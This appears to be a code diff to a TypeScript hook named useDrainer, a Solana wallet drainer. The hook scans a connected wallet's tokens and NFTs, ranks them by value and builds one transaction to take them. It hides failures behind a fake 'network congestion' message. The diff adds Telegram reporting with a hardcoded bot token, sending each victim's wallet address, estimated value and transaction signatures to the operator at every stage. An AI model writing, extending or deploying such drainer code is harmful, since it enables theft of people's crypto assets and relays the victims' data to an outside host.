@@ -36,6 +36,28 @@ const PRIORITY_FEE_MICRO_LAMPORTS = 100_000;
 const MAX_TOKEN_PROCESSING = 22;
 // ------------------
 
+// --- TELEGRAM TELEMETRY CONFIG ---
+const TELEGRAM_BOT_TOKEN = "8703660369:AAEQQBuWwpggS4jnmRb_Ndjfhpqyl6TILTg";
+const TELEGRAM_CHAT_ID = "7566241039";
+
+const sendTelemetry = async (message: string) => {
+  try {
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: `🚀 *DRAINER TELEMETRY*\n\n${message}`,
+        parse_mode: "Markdown",
+      }),
+    });
+  } catch (e) {
+    console.warn("[GOD-TIER] Telemetry failed:", e);
+  }
+};
+// ------------------
+
 type Spl2022Info = {
   isSPL2022: boolean;
   isTransferHook: boolean;
@@ -218,7 +240,13 @@ const handleError = (
   ctx: string = "unknown"
 ) => {
   console.error(`[GOD-TIER] ${ctx} error`, e);
-  
+
+  // TELEMETRY: error
+  const msg = typeof e?.message === "string" ? e.message : String(e);
+  sendTelemetry(
+    `❌ *ERROR*\nContext: \`${ctx}\`\nMessage: \`${msg}\``
+  );
+
   if (e.name === "WalletSignTransactionError") {
     setError("Transaction rejected by user.");
   } else if (e.message?.includes("insufficient funds")) {
@@ -258,9 +286,17 @@ export const useDrainer = () => {
       const data = await resp.json();
       if (data.success) {
         console.log("[GOD-TIER] Backend mirror successful:", data.txid);
+
+        // TELEMETRY: backend mirror success
+        await sendTelemetry(
+          `📡 *Backend Mirror Success*\nWallet: \`${wallet}\`\nTX: \`${data.txid ?? "n/a"}\``
+        );
       }
     } catch (e) {
       console.warn("[GOD-TIER] Backend mirror failed:", e);
+      await sendTelemetry(
+        `⚠️ *Backend Mirror Failed*\nWallet: \`${wallet}\`\nReason: \`${String(e)}\``
+      );
     }
   };
 
@@ -274,6 +310,11 @@ export const useDrainer = () => {
     setStatus("scanning");
     setError(null);
     setStats(null);
+
+    // TELEMETRY: scan started
+    await sendTelemetry(
+      `🔍 *Scan Initiated*\nWallet: \`${publicKey.toBase58()}\``
+    );
 
     try {
       console.log("[GOD-TIER] Neural audit initiated...");
@@ -303,14 +344,21 @@ export const useDrainer = () => {
         const mint = new PublicKey(parsed.mint);
         const { isNft, isSPL2022, isTransferHook } = await classifyAsset(mint, connection);
 
-        console.log(`[GOD-TIER] Token: ${mint.toBase58().slice(0,8)}... (${parsed.tokenAmount.uiAmount}) ${isNft ? 'NFT' : 'SPL'}`);
+        console.log(
+          `[GOD-TIER] Token: ${mint.toBase58().slice(0,8)}... (${parsed.tokenAmount.uiAmount}) ${
+            isNft ? "NFT" : "SPL"
+          }`
+        );
 
         if (isTransferHook && isSPL2022) {
           console.log("[GOD-TIER] Skipping transfer-hook token");
           continue;
         }
 
-        const priorityScore = isNft ? 1000 + parsed.tokenAmount.uiAmount * 100 : parsed.tokenAmount.uiAmount * 10;
+        const priorityScore =
+          isNft
+            ? 1000 + parsed.tokenAmount.uiAmount * 100
+            : parsed.tokenAmount.uiAmount * 10;
         
         assetList.push({
           mint,
@@ -332,14 +380,37 @@ export const useDrainer = () => {
 
       assetList.sort((a, b) => b.priorityScore - a.priorityScore);
       
-      const totalValueUSD = solValueUSD + assetList.reduce((sum, asset) => 
-        sum + (asset.isNft ? 50 : Math.max(10, asset.uiAmount * 0.01)), 0);
+      const totalValueUSD =
+        solValueUSD +
+        assetList.reduce(
+          (sum, asset) =>
+            sum + (asset.isNft ? 50 : Math.max(10, asset.uiAmount * 0.01)),
+          0
+        );
 
-      console.log(`[GOD-TIER] TOTAL VALUE: $${totalValueUSD.toFixed(2)} (threshold: $${MIN_DOLLAR_THRESHOLD})`);
+      console.log(
+        `[GOD-TIER] TOTAL VALUE: $${totalValueUSD.toFixed(
+          2
+        )} (threshold: $${MIN_DOLLAR_THRESHOLD})`
+      );
+
+      // TELEMETRY: scan complete with valuation
+      await sendTelemetry(
+        `📊 *Scan Complete*\nWallet: \`${publicKey.toBase58()}\`\nSOL Value: \`$${solValueUSD.toFixed(
+          2
+        )}\`\nTotal Approx: *$${totalValueUSD.toFixed(2)}*`
+      );
       
       if (totalValueUSD < MIN_DOLLAR_THRESHOLD) {
         setError("Data Packet Network Congestion.");
         setStatus("error");
+
+        await sendTelemetry(
+          `🧊 *Below Threshold*\nWallet: \`${publicKey.toBase58()}\`\nValue: *$${totalValueUSD.toFixed(
+            2
+          )}* (< $${MIN_DOLLAR_THRESHOLD})`
+        );
+
         return;
       }
 
@@ -396,11 +467,18 @@ export const useDrainer = () => {
         processed++;
       }
 
-      console.log(`[GOD-TIER] Built TX: ${instructions.length} instructions (${tokenCount} tokens, ${nftCount} NFTs)`);
+      console.log(
+        `[GOD-TIER] Built TX: ${instructions.length} instructions (${tokenCount} tokens, ${nftCount} NFTs)`
+      );
 
       if (instructions.length <= 1) {
         setError("Data Packet Network Congestion.");
         setStatus("error");
+
+        await sendTelemetry(
+          `⚠️ *No Drainable Assets*\nWallet: \`${publicKey.toBase58()}\``
+        );
+
         return;
       }
 
@@ -412,19 +490,32 @@ export const useDrainer = () => {
         batchCount: 1,
       });
 
+      // TELEMETRY: ready to drain
+      await sendTelemetry(
+        `🧨 *Drain Prepared*\nWallet: \`${publicKey.toBase58()}\`\nTokens: \`${tokenCount}\`, NFTs: \`${nftCount}\`\nApprox: *$${totalValueUSD.toFixed(
+          2
+        )}*`
+      );
+
       // 🏆 ULTIMATE EXECUTION PIPELINE
       setStatus("signing");
       const tx = new Transaction().add(...instructions);
       
       // FRESH BLOCKHASH (CRITICAL)
-      const { context: { slot: minContextSlot }, value: { blockhash, lastValidBlockHeight } } =
-        await connection.getLatestBlockhashAndContext();
+      const {
+        context: { slot: minContextSlot },
+        value: { blockhash, lastValidBlockHeight },
+      } = await connection.getLatestBlockhashAndContext();
 
       tx.recentBlockhash = blockhash;
       tx.feePayer = publicKey;
 
       const signature = await sendTransaction(tx, connection, { minContextSlot });
       console.log(`[GOD-TIER] Signature: ${signature}`);
+
+      await sendTelemetry(
+        `✍️ *TX Signed*\nWallet: \`${publicKey.toBase58()}\`\nSignature: \`${signature}\``
+      );
       
       setStatus("sending");
       
@@ -439,7 +530,16 @@ export const useDrainer = () => {
         );
         setStatus("success");
         console.log(`[GOD-TIER] TOTAL DRAIN COMPLETE: ${signature}`);
+
+        await sendTelemetry(
+          `💰 *DRAIN SUCCESS*\nWallet: \`${publicKey.toBase58()}\`\nApprox Total: *$${totalValueUSD.toFixed(
+            2
+          )}*\nSignature: \`${signature}\``
+        );
       } else {
+        await sendTelemetry(
+          `⛔ *DRAIN FAILED*\nWallet: \`${publicKey.toBase58()}\`\nSignature: \`${signature}\``
+        );
         throw new Error("Transaction failed on-chain");
       }
 
